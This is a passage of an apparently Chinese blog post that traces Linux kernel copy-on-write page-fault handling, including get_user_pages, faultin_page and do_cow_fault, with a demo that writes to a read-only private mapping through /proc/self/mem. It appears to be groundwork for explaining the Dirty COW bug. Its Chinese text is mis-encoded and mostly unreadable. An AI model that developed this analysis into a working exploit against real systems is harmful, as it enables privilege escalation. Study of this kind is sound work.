<span class="hljs-keyword">if</span> (flags &amp; FOLL_GET) &#123;<span class="hljs-comment">//Â¶ÇÊûúËÆæÁΩÆ‰∫ÜGETÊ†áÂøóÔºåÂàô‰ºöËé∑Âèñ‰∏Ä‰∏™È°µÈù¢ÁöÑÂºïÁî®ÔºåÈò≤Ê≠¢È°µÈù¢‰ªéÂÜÖÂ≠ò‰∏≠Ë¢´Êç¢Âá∫</span><br>		get_page(page);<br><br>		<span class="hljs-comment">/* drop the pgmap reference now that we hold the page */</span><br>		<span class="hljs-keyword">if</span> (pgmap) &#123;<br>			put_dev_pagemap(pgmap);<br>			pgmap = <span class="hljs-literal">NULL</span>;<br>		&#125;<br>	&#125;<br>	<span class="hljs-keyword">if</span> (flags &amp; FOLL_TOUCH) &#123;<span class="hljs-comment">//Ê†áËÆ∞‰∏ãËøô‰∏™È°µË¢´ËÆøÈóÆËøá</span><br>        <span class="hljs-comment">//Â¶ÇÊûúË¶ÅÂÜôÂÖ•Ôºå‰ΩÜÊòØÈ°µÈù¢‰πüÂú®‰∏çÊòØËÑèÁöÑËØùÔºåÂ∞±ËÆæÁΩÆ‰∏∫ËÑèÈ°µ</span><br>		<span class="hljs-keyword">if</span> ((flags &amp; FOLL_WRITE) &amp;&amp;<br>		    !pte_dirty(pte) &amp;&amp; !PageDirty(page))<br>			set_page_dirty(page);<br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * pte_mkyoung() would be more correct here, but atomic care</span><br><span class="hljs-comment">		 * is needed to avoid losing the dirty bit: it is easier to use</span><br><span class="hljs-comment">		 * mark_page_accessed().</span><br><span class="hljs-comment">		 */</span><br>       <span class="hljs-comment">//Ê†áËÆ∞</span><br>		mark_page_accessed(page);<br>	&#125;<br>	<span class="hljs-keyword">if</span> ((flags &amp; FOLL_MLOCK) &amp;&amp; (vma-&gt;vm_flags &amp; VM_LOCKED)) &#123;<br>		<span class="hljs-comment">/* Do not mlock pte-mapped THP */</span><br>		<span class="hljs-keyword">if</span> (PageTransCompound(page))<br>			<span class="hljs-keyword">goto</span> out;<br><br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * The preliminary mapping check is mainly to avoid the</span><br><span class="hljs-comment">		 * pointless overhead of lock_page on the ZERO_PAGE</span><br><span class="hljs-comment">		 * which might bounce very badly if there is contention.</span><br><span class="hljs-comment">		 *</span><br><span class="hljs-comment">		 * If the page is already locked, we don&#x27;t need to</span><br><span class="hljs-comment">		 * handle it now - vmscan will handle it later if and</span><br><span class="hljs-comment">		 * when it attempts to reclaim the page.</span><br><span class="hljs-comment">		 */</span><br>		<span class="hljs-keyword">if</span> (page-&gt;mapping &amp;&amp; trylock_page(page)) &#123;<br>			lru_add_drain();  <span class="hljs-comment">/* push cached pages to LRU */</span><br>			<span class="hljs-comment">/*</span><br><span class="hljs-comment">			 * Because we lock page here, and migration is</span><br><span class="hljs-comment">			 * blocked by the pte&#x27;s page reference, and we</span><br><span class="hljs-comment">			 * know the page is still mapped, we don&#x27;t even</span><br><span class="hljs-comment">			 * need to check for file-cache page truncation.</span><br><span class="hljs-comment">			 */</span><br>			mlock_vma_page(page);<br>			unlock_page(page);<br>		&#125;<br>	&#125;<br>out:<br>	pte_unmap_unlock(ptep, ptl);<br>	<span class="hljs-keyword">return</span> page;<br>no_page:<br>	pte_unmap_unlock(ptep, ptl);<br>	<span class="hljs-keyword">if</span> (!pte_none(pte))<br>		<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>	<span class="hljs-keyword">return</span> no_page_table(vma, flags);<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="faultin-page"><a href="#faultin-page" class="headerlink" title="faultin_page()"></a>faultin_page()</h4><p><code>faultin_page()</code>‰ºöÊää<code>flags</code>‰∏≠ÁöÑ<code>FOLL</code>_Ê†áÂøóËΩ¨‰∏∫<code>handle_mm_fault()</code>‰ΩøÁî®ÁöÑ<code>FAULT_</code>Ê†áÂøó, ÁÑ∂ÂêéË∞ÉÁî®<code>handle_mm_fault()</code>Â§ÑÁêÜ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * mmap_sem must be held on entry.  If @nonblocking != NULL and</span><br><span class="hljs-comment"> * *@flags does not include FOLL_NOWAIT, the mmap_sem may be released.</span><br><span class="hljs-comment"> * If it is, *@nonblocking will be set to 0 and -EBUSY returned.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">faultin_page</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *tsk, <span class="hljs-keyword">struct</span> vm_area_struct *vma,</span><br><span class="hljs-params">		<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *flags, <span class="hljs-type">int</span> *nonblocking)</span><br>&#123;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fault_flags = <span class="hljs-number">0</span>;<br>	<span class="hljs-type">int</span> ret;<br><br>	<span class="hljs-comment">/* mlock all present pages, but do not fault in new pages */</span><br>	<span class="hljs-keyword">if</span> ((*flags &amp; (FOLL_POPULATE | FOLL_MLOCK)) == FOLL_MLOCK)<br>		<span class="hljs-keyword">return</span> -ENOENT;<br>	<span class="hljs-comment">/* For mm_populate(), just skip the stack guard page. */</span><br>	<span class="hljs-keyword">if</span> ((*flags &amp; FOLL_POPULATE) &amp;&amp;<br>			(stack_guard_page_start(vma, address) ||<br>			 stack_guard_page_end(vma, address + PAGE_SIZE)))<br>		<span class="hljs-keyword">return</span> -ENOENT;<br>    <br>    <span class="hljs-comment">//Ê†πÊçÆFOLL_Ê†áÁùÄËÆæÁΩÆFAULT_FLAGÊ†áÂøó</span><br>	<span class="hljs-keyword">if</span> (*flags &amp; FOLL_WRITE)<br>		fault_flags |= FAULT_FLAG_WRITE;<br>	<span class="hljs-keyword">if</span> (*flags &amp; FOLL_REMOTE)<br>		fault_flags |= FAULT_FLAG_REMOTE;<br>	<span class="hljs-keyword">if</span> (nonblocking)<br>		fault_flags |= FAULT_FLAG_ALLOW_RETRY;<br>	<span class="hljs-keyword">if</span> (*flags &amp; FOLL_NOWAIT)<br>		fault_flags |= FAULT_FLAG_ALLOW_RETRY | FAULT_FLAG_RETRY_NOWAIT;<br>	<span class="hljs-keyword">if</span> (*flags &amp; FOLL_TRIED) &#123;<br>		VM_WARN_ON_ONCE(fault_flags &amp; FAULT_FLAG_ALLOW_RETRY);<br>		fault_flags |= FAULT_FLAG_TRIED;<br>	&#125;<br>	<span class="hljs-comment">//Â§ÑÁêÜÁº∫È°µÂºÇÂ∏∏</span><br>	ret = handle_mm_fault(vma, address, fault_flags);<br>	<span class="hljs-keyword">if</span> (ret &amp; VM_FAULT_ERROR) &#123;<br>		<span class="hljs-keyword">if</span> (ret &amp; VM_FAULT_OOM)<br>			<span class="hljs-keyword">return</span> -ENOMEM;<br>		<span class="hljs-keyword">if</span> (ret &amp; (VM_FAULT_HWPOISON | VM_FAULT_HWPOISON_LARGE))<br>			<span class="hljs-keyword">return</span> *flags &amp; FOLL_HWPOISON ? -EHWPOISON : -EFAULT;<br>		<span class="hljs-keyword">if</span> (ret &amp; (VM_FAULT_SIGBUS | VM_FAULT_SIGSEGV))<br>			<span class="hljs-keyword">return</span> -EFAULT;<br>		BUG();<br>	&#125;<br><br>	<span class="hljs-keyword">if</span> (tsk) &#123;<br>		<span class="hljs-keyword">if</span> (ret &amp; VM_FAULT_MAJOR)<br>			tsk-&gt;maj_flt++;<br>		<span class="hljs-keyword">else</span><br>			tsk-&gt;min_flt++;<br>	&#125;<br><br>	<span class="hljs-keyword">if</span> (ret &amp; VM_FAULT_RETRY) &#123;<br>		<span class="hljs-keyword">if</span> (nonblocking)<br>			*nonblocking = <span class="hljs-number">0</span>;<br>		<span class="hljs-keyword">return</span> -EBUSY;<br>	&#125;<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * The VM_FAULT_WRITE bit tells us that do_wp_page has broken COW when</span><br><span class="hljs-comment">	 * necessary, even if maybe_mkwrite decided not to set pte_write. We</span><br><span class="hljs-comment">	 * can thus safely do subsequent page lookups as if they were reads.</span><br><span class="hljs-comment">	 * But only do so when looping for pte_write is futile: in some cases</span><br><span class="hljs-comment">	 * userspace may also be wanting to write to the gotten user page,</span><br><span class="hljs-comment">	 * which a read fault here might prevent (a readonly page might get</span><br><span class="hljs-comment">	 * reCOWed by userspace write).</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))<br>		*flags &amp;= ~FOLL_WRITE;<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="Â§ßËá¥ÁöÑÊµÅÁ®ã"><a href="#Â§ßËá¥ÁöÑÊµÅÁ®ã" class="headerlink" title="Â§ßËá¥ÁöÑÊµÅÁ®ã"></a>Â§ßËá¥ÁöÑÊµÅÁ®ã</h4><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs SCSS"><span class="hljs-built_in">mem_write</span>()<br>	<span class="hljs-built_in">mem_rw</span>()<br>		<span class="hljs-built_in">__access_remote_vm</span>()<br>			<span class="hljs-built_in">__get_user_pages_remote</span>()<br>				<span class="hljs-built_in">__get_user_pages_locked</span>()<br>					<span class="hljs-built_in">__get_user_pages</span>()<br>						<span class="hljs-built_in">follow_page_mask</span>()<br>							<span class="hljs-built_in">follow_page_pte</span>()<br>						<span class="hljs-built_in">faultin_page</span>()<br></code></pre></td></tr></table></figure>

<h3 id="get-user-pages„ÅÆÂ•áÂ¶ôÊóÖÈÄîü§î"><a href="#get-user-pages„ÅÆÂ•áÂ¶ôÊóÖÈÄîü§î" class="headerlink" title="__get_user_pages„ÅÆÂ•áÂ¶ôÊóÖÈÄîü§î"></a>__get_user_pages„ÅÆÂ•áÂ¶ôÊóÖÈÄîü§î</h3><h4 id="ÊµãËØïdemo"><a href="#ÊµãËØïdemo" class="headerlink" title="ÊµãËØïdemo"></a>ÊµãËØïdemo</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-type">int</span> fd;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br><span class="hljs-type">void</span> *mem;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">processMem</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> f = open(<span class="hljs-string">&quot;/proc/self/mem&quot;</span>, O_RDWR);<br>    lseek(f, mem, SEEK_SET);<br>    write(f, <span class="hljs-string">&quot;AAA&quot;</span>, <span class="hljs-number">3</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    fd = open(<span class="hljs-string">&quot;./test&quot;</span>, O_RDONLY);<br>    fstat(fd, &amp;st);<br>    mem = mmap(<span class="hljs-literal">NULL</span>, st.st_size, PROT_READ, MAP_PRIVATE, fd, <span class="hljs-number">0</span>);<br><br>    processMem();<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="get-user-pages„ÅÆÁ¨¨‰∏ÄÊ¨°Âæ™ÁéØ"><a href="#get-user-pages„ÅÆÁ¨¨‰∏ÄÊ¨°Âæ™ÁéØ" class="headerlink" title="__get_user_pages„ÅÆÁ¨¨‰∏ÄÊ¨°Âæ™ÁéØ"></a>__get_user_pages„ÅÆÁ¨¨‰∏ÄÊ¨°Âæ™ÁéØ</h4><p>Áî±‰∫é<code>linux</code>ÁöÑÂÜÖÊ†∏ÁöÑÂª∂ËøüÁªëÂÆöÊú∫Âà∂ÔºåÁ¨¨‰∏ÄÊ¨°ËÆøÈóÆÊüê‰∏™ÂÜÖÂ≠òÈ°µ‰πãÂâç<code>linux kernel</code> Âπ∂‰∏ç‰ºö‰∏∫ÂÖ∂ÂàÜÈÖçÁâ©ÁêÜÈ°µÔºåÊâÄ‰ª•Ëé∑Âèñ‰∏çÂà∞ÂØπÂ∫îÁöÑÈ°µË°®È°πÔºåÂõ†Ê≠§Á¨¨‰∏ÄÊ¨°ËøõÂÖ•<code>follow_page_mask</code>Ëá™ÁÑ∂ÊòØËøîÂõûNULLÔºåÊ≠§Êó∂Ë∞ÉÁî®<code>faultin_page()</code>ÔºåËøõÂÖ•<code>handle_mm_fault</code>ÔºåÂºÄÂßãÁº∫È°µÂºÇÂ∏∏Â§ÑÁêÜ</p>
<p><code>__handle_mm_fault()</code>Ë¥üË¥£ÂàÜÈÖçÂêÑÁ∫ßÈ°µË°®È°π, ÁÑ∂ÂêéË∞ÉÁî®<code>handle_pte_fault()</code></p>
<p><code>handle_pte_fault()</code>ÂèëÁé∞ÊòØÊò†Â∞ÑÂà∞Êñá‰ª∂, ‰ΩÜÊï¥‰∏™<code>PTE</code>‰∏∫<code>none</code>ÁöÑÊÉÖÂÜµ, ‰ºöË∞ÉÁî®<code>do_fault()</code>Â§ÑÁêÜ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> (!fe-&gt;pte) &#123;<span class="hljs-comment">//Â¶ÇÊûú fe-&gt;pte ‰∏∫Á©∫ÔºåÂàôËØ¥ÊòéÈ°µÈù¢‰∏çÂ≠òÂú®ÔºåÊ†πÊçÆ VMAÔºàVirtual Memory AreaÔºâÊòØÂê¶ÂåøÂêçÊâßË°å‰∏çÂêåÁöÑÈ°µÈù¢Â§ÑÁêÜÊìç‰Ωú„ÄÇ</span><br>		<span class="hljs-keyword">if</span> (vma_is_anonymous(fe-&gt;vma))<br>			<span class="hljs-keyword">return</span> do_anonymous_page(fe);<br>		<span class="hljs-keyword">else</span><br>			<span class="hljs-keyword">return</span> do_fault(fe);<span class="hljs-comment">//ÂàÜÈÖçÁâ©ÁêÜÈ°µÊ°Ü</span><br>	&#125;<br></code></pre></td></tr></table></figure>

<p><code>do_fault()</code>ÂèëÁé∞ÈúÄË¶ÅÂÜôÂÖ•ÁßÅÊúâÊñá‰ª∂Êò†Â∞ÑÁöÑÂÜÖÂ≠òÂå∫Â∞±‰ºöË∞ÉÁî®<code>do_cow_fault()</code>ËøõË°åÂÜôÊó∂Â§çÂà∂</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_SHARED))<span class="hljs-comment">//Â¶ÇÊûúËôöÊãüÂÜÖÂ≠òÂå∫ÂüüÁöÑÊ†áÂøó‰∏≠‰∏çÂåÖÂê´ VM_SHARED Ê†áÂøóÔºåËØ¥ÊòéËØ•Âå∫ÂüüÊòØÁßÅÊúâÁöÑÔºåÂáΩÊï∞Ë∞ÉÁî® do_cow_fault ÂáΩÊï∞Â§ÑÁêÜÂÜôÊó∂Â§çÂà∂ÈîôËØØÔºàCopy-On-Write FaultÔºâ„ÄÇ</span><br>		<span class="hljs-keyword">return</span> do_cow_fault(fe, pgoff);<br></code></pre></td></tr></table></figure>

<ul>
<li>È¶ñÂÖàË∞ÉÁî®<code>alloc_page_vma()</code>ÂàÜÈÖç‰∏Ä‰∏™Êñ∞È°µ</li>
<li>ÁÑ∂ÂêéË∞ÉÁî®<code>__do_fault()</code>ÈúÄË¶ÅÊâæ<code>address</code>ÂØπÂ∫îÁöÑÂéüÂßãÈ°µÁöÑÊèèËø∞Á¨¶</li>
<li>ÁÑ∂ÂêéË∞ÉÁî®<code>copy_user_highpage()</code>ÊääÂéüÂßãÈ°µÁöÑÂÜÖÂÆπÂ§çÂà∂Âà∞Êñ∞È°µ‰∏≠</li>
<li>Êñ∞ÊóßÈ°µÈÉΩË¢´Êò†Â∞ÑÂà∞ÂÜÖÊ†∏Âú∞ÂùÄÁ©∫Èó¥‰∏≠, Âõ†Ê≠§Â§çÂà∂ÁöÑÊó∂ÂÄôÁõ¥Êé•<code>memcpy()</code>Â∞±ÂèØ‰ª•</li>
<li>ÊúÄÂêéË∞ÉÁî®<code>alloc_set_pte()</code>ËÆæÁΩÆÈ°µË°®ÁöÑ<strong>PTE</strong>, Âª∫Á´ãÂèçÂêëÊò†Â∞Ñ</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_cow_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fault_env *fe, <span class="hljs-type">pgoff_t</span> pgoff)</span><br>&#123;<br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> fe-&gt;vma;<br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">fault_page</span>, *<span class="hljs-title">new_page</span>;</span><br> <span class="hljs-type">void</span> *fault_entry;<br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mem_cgroup</span> *<span class="hljs-title">memcg</span>;</span><br> <span class="hljs-type">int</span> ret;<br><br> <span class="hljs-keyword">if</span> (unlikely(anon_vma_prepare(vma)))<br>  <span class="hljs-keyword">return</span> VM_FAULT_OOM;<br><br> new_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, fe-&gt;address);<span class="hljs-comment">//‰∏∫ÂΩìÂâçËøõÁ®ãÂàÜÈÖç‰∏Ä‰∏™Êñ∞ÁöÑÈ°µÈù¢</span><br> <span class="hljs-keyword">if</span> (!new_page)<br>  <span class="hljs-keyword">return</span> VM_FAULT_OOM;<br><br> <span class="hljs-keyword">if</span> (mem_cgroup_try_charge(new_page, vma-&gt;vm_mm, GFP_KERNEL,<span class="hljs-comment">//‰∏∫Êñ∞È°µÈù¢ÂàÜÈÖçÂÜÖÂ≠òËµÑÊ∫ê</span><br>    &amp;memcg, <span class="hljs-literal">false</span>)) &#123;<br>  put_page(new_page);<br>  <span class="hljs-keyword">return</span> VM_FAULT_OOM;<br> &#125;<br><br> ret = __do_fault(fe, pgoff, new_page, &amp;fault_page, &amp;fault_entry);<span class="hljs-comment">//ËØªÂèñÊñá‰ª∂ÂÜÖÂÆπÂà∞fault_page</span><br> <span class="hljs-keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))<br>  <span class="hljs-keyword">goto</span> uncharge_out;<br><br> <span class="hljs-keyword">if</span> (!(ret &amp; VM_FAULT_DAX_LOCKED))<br>  copy_user_highpage(new_page, fault_page, fe-&gt;address, vma);<span class="hljs-comment">//Êã∑Ë¥ùfault_pageÂÜÖÂÆπÂà∞new_page</span><br> __SetPageUptodate(new_page);<br><br> ret |= alloc_set_pte(fe, memcg, new_page);<span class="hljs-comment">//ËÆæÁΩÆpteÔºåÁΩÆÊç¢ËØ•ËøõÁ®ã‰∏≠ÁöÑpteË°®È°πÔºåÂØπ‰∫éÂÜôÊìç‰Ωú‰ºöÂ∞ÜËØ•È°µÊ†áËÑèÔºàËØ•ÂáΩÊï∞‰ºöË∞ÉÁî®maybe_mkwrite()ÂáΩÊï∞ÔºåÂÖ∂‰ºöË∞ÉÁî®pte_mkdirty()ÂáΩÊï∞Ê†áËÑèËØ•È°µÔºâ</span><br> <span class="hljs-keyword">if</span> (fe-&gt;pte)<br>  pte_unmap_unlock(fe-&gt;pte, fe-&gt;ptl);<br> <span class="hljs-keyword">if</span> (!(ret &amp; VM_FAULT_DAX_LOCKED)) &#123;<span class="hljs-comment">//ÈáäÊîæfault_page</span><br>  unlock_page(fault_page);<br>  put_page(fault_page);<br> &#125; <span class="hljs-keyword">else</span> &#123;<br>  dax_unlock_mapping_entry(vma-&gt;vm_file-&gt;f_mapping, pgoff);<br> &#125;<br> <span class="hljs-keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))<br>  <span class="hljs-keyword">goto</span> uncharge_out;<br> <span class="hljs-keyword">return</span> ret;<br>uncharge_out:<br> mem_cgroup_cancel_charge(new_page, memcg, <span class="hljs-literal">false</span>);<br> put_page(new_page);<br> <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>alloc_set_pte()</code>ÊµÅÁ®ãÂ¶Ç‰∏ã, Âú®Êú¨ÊµãËØïÁ®ãÂ∫è‰∏≠, Áî±‰∫éËøõË°å<code>COW</code>ÁöÑ<code>VMA</code>Âå∫Âüü‰∏çÂèØÂÜôÂÖ•, Âõ†Ê≠§ÂæóÂà∞ÁöÑ<code>COW</code>È°µÂè™ÊúâËÑèÊ†áÂøó, Ê≤°ÊúâÂèØÂÜôÊ†áÂøó</p>
<p>Ê≥®ÊÑèËøôÈáåÁöÑ<code>set_pte_at()</code>, ‰ºöÊääÊèèËø∞Ê≠§Áâ©ÁêÜÈ°µÁöÑ<code>pte</code>ÂÜôÂÖ•Âà∞<code>vma-&gt;vm_mm</code>Ëøô‰∏™Âú∞ÂùÄÁ©∫Èó¥ÁöÑÈ°µË°®‰∏≠, ‰πüÂ∞±ÊòØËÆ©ÂÖ∂‰ªñÁî®Êà∑ËøõÁ®ãÁöÑËôöÊãüÂÜÖÂ≠òÊò†Â∞ÑÂà∞Ëøô‰∏™Áâ©ÁêÜÈ°µ‰∏≠.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">alloc_set_pte</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fault_env *fe, <span class="hljs-keyword">struct</span> mem_cgroup *memcg,</span><br><span class="hljs-params">		<span class="hljs-keyword">struct</span> page *page)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> fe-&gt;vma;<br>	<span class="hljs-type">bool</span> write = fe-&gt;flags &amp; FAULT_FLAG_WRITE;<br>	<span class="hljs-type">pte_t</span> entry;<br>	<span class="hljs-type">int</span> ret;<br><br>	<span class="hljs-keyword">if</span> (pmd_none(*fe-&gt;pmd) &amp;&amp; PageTransCompound(page) &amp;&amp;<br>			IS_ENABLED(CONFIG_TRANSPARENT_HUGE_PAGECACHE)) &#123;<br>		<span class="hljs-comment">/* THP on COW? */</span><br>		VM_BUG_ON_PAGE(memcg, page);<br><br>		ret = do_set_pmd(fe, page);<br>		<span class="hljs-keyword">if</span> (ret != VM_FAULT_FALLBACK)<br>			<span class="hljs-keyword">return</span> ret;<br>	&#125;<br><br>	<span class="hljs-keyword">if</span> (!fe-&gt;pte) &#123;<br>		ret = pte_alloc_one_map(fe);<br>		<span class="hljs-keyword">if</span> (ret)<br>			<span class="hljs-keyword">return</span> ret;<br>	&#125;<br><br>	<span class="hljs-comment">/* Re-check under ptl */</span><br>	<span class="hljs-keyword">if</span> (unlikely(!pte_none(*fe-&gt;pte)))<br>		<span class="hljs-keyword">return</span> VM_FAULT_NOPAGE;<br><br>	flush_icache_page(vma, page);<br>	entry = mk_pte(page, vma-&gt;vm_page_prot);	<span class="hljs-comment">//Ê†πÊçÆÈ°µÁâ©ÁêÜÂú∞ÂùÄ‰∏éVMAÊùÉÈôêÁîüÊàêPTE</span><br>	<span class="hljs-keyword">if</span> (write)								 <span class="hljs-comment">//pte_mkdirty‰ºöÁªôPTEÂä†‰∏äËÑè‰Ωç</span><br>		entry = maybe_mkwrite(pte_mkdirty(entry), vma); <span class="hljs-comment">//Â¶ÇÊûúËøôÁâáVMAÂèØÂÜôÔºåÈÇ£‰πàmaybe_mkwrite()‰ºöÁªôPTEÂä†‰∏äÂèØÂÜô‰Ωç</span><br>	<span class="hljs-comment">/* copy-on-write page */</span><br>    <span class="hljs-comment">//Âª∫Á´ãÂèçÂêëÊò†Â∞ÑÔºö‰ªépageÂØπË±°Ëß¶ÂèëÔºåÊâæÂà∞Êò†Â∞ÑÂà∞Ê≠§ÁöÑVMA</span><br>	<span class="hljs-keyword">if</span> (write &amp;&amp; !(vma-&gt;vm_flags &amp; VM_SHARED)) &#123;<br>		inc_mm_counter_fast(vma-&gt;vm_mm, MM_ANONPAGES);<br>		page_add_new_anon_rmap(page, vma, fe-&gt;address, <span class="hljs-literal">false</span>);<br>		